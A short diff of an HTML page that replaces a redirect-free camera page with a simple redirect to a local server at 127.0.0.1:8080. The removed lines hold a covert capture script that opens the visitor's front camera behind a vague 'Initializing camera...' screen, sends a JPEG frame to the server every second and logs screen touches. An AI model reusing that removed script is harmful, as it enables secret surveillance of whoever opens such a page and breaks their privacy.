@@ -1,8 +1,14 @@
-<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><title></title></head><body style="margin:0;padding:20px;background:#000;color:#0f0;font-family:monospace;font-size:14px;">
-<div id="status">Initializing camera...</div><canvas id="c" style="display:none;"></canvas>
-<script src="/socket.io/socket.io.js"></script>
-<script>
-let cap=false,t=0;document.addEventListener('touchstart',e=>{t++;fetch('/touch',{method:'POST'});if(!cap){cap=true;fetch('/start',{method:'POST'});document.getElementById('status').innerHTML='Live camera active...';}});
-navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}).then(s=>{
-let v=document.createElement('video');v.srcObject=s;v.play();v.onloadedmetadata=()=>{setInterval(()=>{let c=document.getElementById('c'),x=c.getContext('2d');c.width=v.videoWidth;c.height=v.videoHeight;x.drawImage(v,0,0);fetch('/image',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:c.toDataURL('image/jpeg',0.7)})})},1000)}});
-</script></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirect to Localhost</title>
+    <meta http-equiv="refresh" content="0; url=http://127.0.0.1:8080">
+    <script>
+        window.location.href = 'http://127.0.0.1:8080';
+    </script>
+</head>
+<body>
+    <p>Redirecting to <a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a>...</p>
+</body>
+</html>
